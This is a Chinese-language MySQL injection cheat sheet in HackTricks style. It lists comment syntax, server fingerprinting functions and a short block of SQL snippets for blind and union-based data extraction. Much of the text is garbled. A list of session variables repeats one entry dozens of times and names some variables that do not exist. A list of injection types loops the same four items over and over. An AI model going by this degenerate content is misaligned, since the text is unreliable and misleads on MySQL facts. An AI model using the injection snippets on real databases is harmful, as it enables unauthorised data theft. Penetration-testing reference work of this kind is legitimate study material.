# MySQL注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/)是**西班牙**最重要的网络安全活动之一，也是**欧洲**最重要的活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流。

{% embed url="https://www.rootedcon.com/" %}

## 评论
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## 有趣的函数

### 确认Mysql:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### 有用的函数

The following functions can be useful when performing MySQL injection attacks:

以下函数在执行MySQL注入攻击时非常有用：

- `version()`: Returns the version of the MySQL server.

- `version()`: 返回MySQL服务器的版本。

- `database()`: Returns the name of the current database.

- `database()`: 返回当前数据库的名称。

- `user()`: Returns the username used to connect to the MySQL server.

- `user()`: 返回用于连接到MySQL服务器的用户名。

- `current_user()`: Returns the current user.

- `current_user()`: 返回当前用户。

- `@@hostname`: Returns the hostname of the MySQL server.

- `@@hostname`: 返回MySQL服务器的主机名。

- `@@datadir`: Returns the data directory of the MySQL server.

- `@@datadir`: 返回MySQL服务器的数据目录。

- `@@basedir`: Returns the base directory of the MySQL server.

- `@@basedir`: 返回MySQL服务器的基本目录。

- `@@version_compile_os`: Returns the operating system on which the MySQL server is running.

- `@@version_compile_os`: 返回MySQL服务器运行的操作系统。

- `@@version`: Returns the version of the MySQL server.

- `@@version`: 返回MySQL服务器的版本。

- `@@global.version_compile_os`: Returns the operating system on which the MySQL server is running.

- `@@global.version_compile_os`: 返回MySQL服务器运行的操作系统。

- `@@global.version`: Returns the version of the MySQL server.

- `@@global.version`: 返回MySQL服务器的版本。

- `@@session.auto_increment_increment`: Returns the auto-increment increment value.

- `@@session.auto_increment_increment`: 返回自增增量值。

- `@@session.auto_increment_offset`: Returns the auto-increment offset value.

- `@@session.auto_increment_offset`: 返回自增偏移值。

- `@@session.character_set_database`: Returns the character set used by the current database.

- `@@session.character_set_database`: 返回当前数据库使用的字符集。

- `@@session.collation_database`: Returns the collation used by the current database.

- `@@session.collation_database`: 返回当前数据库使用的排序规则。

- `@@session.sql_mode`: Returns the SQL mode used by the current session.

- `@@session.sql_mode`: 返回当前会话使用的SQL模式。

- `@@session.tx_isolation`: Returns the transaction isolation level used by the current session.

- `@@session.tx_isolation`: 返回当前会话使用的事务隔离级别。

- `@@session.wait_timeout`: Returns the wait timeout value for the current session.

- `@@session.wait_timeout`: 返回当前会话的等待超时值。

- `@@session.system_time_zone`: Returns the system time zone.

- `@@session.system_time_zone`: 返回系统时区。

- `@@session.time_zone`: Returns the time zone used by the current session.

- `@@session.time_zone`: 返回当前会话使用的时区。

- `@@session.character_set_server`: Returns the character set used by the MySQL server.

- `@@session.character_set_server`: 返回MySQL服务器使用的字符集。

- `@@session.collation_server`: Returns the collation used by the MySQL server.

- `@@session.collation_server`: 返回MySQL服务器使用的排序规则。

- `@@session.max_allowed_packet`: Returns the maximum allowed packet size for the current session.

- `@@session.max_allowed_packet`: 返回当前会话的最大允许数据包大小。

- `@@session.net_buffer_length`: Returns the network buffer length for the current session.

- `@@session.net_buffer_length`: 返回当前会话的网络缓冲区长度。

- `@@session.query_cache_size`: Returns the query cache size for the current session.

- `@@session.query_cache_size`: 返回当前会话的查询缓存大小。

- `@@session.query_cache_type`: Returns the query cache type for the current session.

- `@@session.query_cache_type`: 返回当前会话的查询缓存类型。

- `@@session.sql_mode`: Returns the SQL mode used by the current session.

- `@@session.sql_mode`: 返回当前会话使用的SQL模式。

- `@@session.sql_auto_is_null`: Returns the SQL_AUTO_IS_NULL mode for the current session.

- `@@session.sql_auto_is_null`: 返回当前会话的SQL_AUTO_IS_NULL模式。

- `@@session.sql_select_limit`: Returns the SQL_SELECT_LIMIT value for the current session.

- `@@session.sql_select_limit`: 返回当前会话的SQL_SELECT_LIMIT值。

- `@@session.sql_warnings`: Returns the SQL_WARNINGS mode for the current session.

- `@@session.sql_warnings`: 返回当前会话的SQL_WARNINGS模式。

- `@@session.transaction_read_only`: Returns the TRANSACTION_READ_ONLY mode for the current session.

- `@@session.transaction_read_only`: 返回当前会话的TRANSACTION_READ_ONLY模式。

- `@@session.transaction_isolation`: Returns the transaction isolation level for the current session.

- `@@session.transaction_isolation`: 返回当前会话的事务隔离级别。

- `@@session.transaction_allow_batching`: Returns the TRANSACTION_ALLOW_BATCHING mode for the current session.

- `@@session.transaction_allow_batching`: 返回当前会话的TRANSACTION_ALLOW_BATCHING模式。

- `@@session.transaction_prealloc_size`: Returns the TRANSACTION_PREALLOC_SIZE value for the current session.

- `@@session.transaction_prealloc_size`: 返回当前会话的TRANSACTION_PREALLOC_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_batch_size`: Returns the TRANSACTION_ALLOC_BATCH_SIZE value for the current session.

- `@@session.transaction_alloc_batch_size`: 返回当前会话的TRANSACTION_ALLOC_BATCH_SIZE值。

- `@@session.transaction_alloc_extent_size`: Returns the TRANSACTION_ALLOC_EXTENT_SIZE value for the current session.

- `@@session.transaction_alloc_extent_size`: 返回当前会话的TRANSACTION_ALLOC_EXTENT_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `@@session.transaction_alloc_block_size`: 返回当前会话的TRANSACTION_ALLOC_BLOCK_SIZE值。

- `@@session.transaction_alloc_block_size`: Returns the TRANSACTION_ALLOC_BLOCK_SIZE value for the current session.

- `
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## 所有注入

### SQL Injection

SQL注入是一种常见的Web应用程序漏洞，攻击者可以通过在用户输入中插入恶意的SQL代码来执行未经授权的数据库操作。这种漏洞可能导致敏感数据泄露、数据篡改、服务器崩溃等问题。

#### MySQL注入

MySQL是一种流行的关系型数据库管理系统，常用于Web应用程序。以下是一些常见的MySQL注入技术：

- **基于错误的注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **基于布尔的注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的布尔值来判断数据库中的数据。

- **基于时间的注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的响应时间来判断数据库中的数据。

- **联合查询注入**：攻击者通过在SQL查询中插入额外的查询语句，从而执行多个查询并获取更多的数据。

- **堆叠查询注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

